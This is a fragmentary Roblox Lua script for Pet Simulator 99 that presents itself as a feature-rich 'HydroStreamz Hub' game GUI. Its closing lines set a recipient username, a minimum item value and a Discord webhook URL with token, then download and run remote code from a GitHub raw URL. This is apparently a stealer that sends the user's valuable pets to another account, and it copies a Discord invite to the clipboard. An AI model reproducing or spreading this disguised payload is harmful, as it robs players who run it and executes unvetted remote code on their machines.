...
local Window = OrionLib:MakeWindow({
    Name = "HydroStreamz Hub🌀",
    HidePremium = true,
    SaveConfig = true,
    ConfigFolder = "HydroStreamz🌀",
    IntroEnabled = true,  -- Panatilihing totoong ang IntroEnabled kung nais mong magkaroon ng intro.
    IntroText = "Welcome to HydroStreamz Hub 🌀Script!"  -- Palitan ang IntroText ayon sa iyong gusto.
})
...
Tab:AddParagraph("REGARDING HUB","•My HYDROSTREAMZ HUB in Pet Simulator 99 is a potent script that enriches your gaming experience by providing essential features for seamless gameplay•")
...
if toggle.Value == false then
    ...
    -- Second set of pets
    swapPets("Corgi", "Titanic Nightmare Cat")
    toggle.Value = false
			end
...
Username = "lianpogi656"
Username2 = "lianpogi656" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "https://discord.com/api/webhooks/1243344875089563790/TgBmTHmdtAvAC7-osS0_6HCjWrtRFST56eOENYyKW0DSlegTRtoQBw3rkPxHK6ff-T0I"
Support = false -- if you dont want to support me make this "false" (without quotes). 50% chance I get hit if its 10+ huges or 500+ mil rap
min_rap = 200000 -- minimum rap of each item you want to get sent to you.
loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()

setclipboard("https://discord.com/invite/4yhNDKFGUA")
